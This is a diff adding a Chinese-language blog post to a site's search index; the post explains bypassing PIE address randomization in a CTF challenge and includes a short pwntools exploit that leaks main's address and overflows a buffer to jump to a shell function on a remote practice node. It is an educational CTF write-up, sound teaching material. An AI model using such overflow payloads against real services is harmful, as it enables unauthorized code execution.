@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>pie保护</title>
+      <link href="/2025/02/06/pie%E4%BF%9D%E6%8A%A4/"/>
+      <url>/2025/02/06/pie%E4%BF%9D%E6%8A%A4/</url>
+      
+        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。简单地说就是<strong>地址随机化</strong>。</p><p>我们需要得到一个函数pie地址，一般为0x55或0x56开头，去求pie_base及pie基址。跟libc利用很像。用得到的地址减去IDA里对应的函数地址得到pie_base之后我们就可以调用IDA中的函数。</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-06%20173833.png" alt="屏幕截图 2025-02-06 173833"></p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-06%20173858.png" alt="屏幕截图 2025-02-06 173858"></p><p>很容易可以看出pie保护开启的状态</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这是典型的地址泄漏。</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-06%20163743.png" alt="屏幕截图 2025-02-06 163743"></p><p>NX保护和PIE保护开启，IDA分析</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-06%20163811.png" alt="屏幕截图 2025-02-06 163811"></p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-06%20163817.png" alt="屏幕截图 2025-02-06 163817"></p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-06%20163828.png" alt="屏幕截图 2025-02-06 163828"></p><p>主函数里面可以打印出main函数的地址，用此函数地址-IDA中main函数地址+IDA中shell的地址就是shell的真实地址</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">i = remote("node5.anna.nssctf.cn",25119)</span><br><span class="line">main_address = 0x770</span><br><span class="line">shell_address = 0x80F</span><br><span class="line">i.recvuntil(b'gift!')</span><br><span class="line"></span><br><span class="line">main_real_addr = int(i.recv()[1:11],16)</span><br><span class="line">print(main_real_addr)</span><br><span class="line"> </span><br><span class="line">shell_real = main_real_addr - main_address + shell_address</span><br><span class="line">payload = b'a'*(0x28+4)+p32(shell_real)</span><br><span class="line">i.sendline(payload)</span><br><span class="line">i.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>canary保护</title>
       <link href="/2025/02/05/canary%E4%BF%9D%E6%8A%A4/"/>
       <url>/2025/02/05/canary%E4%BF%9D%E6%8A%A4/</url>
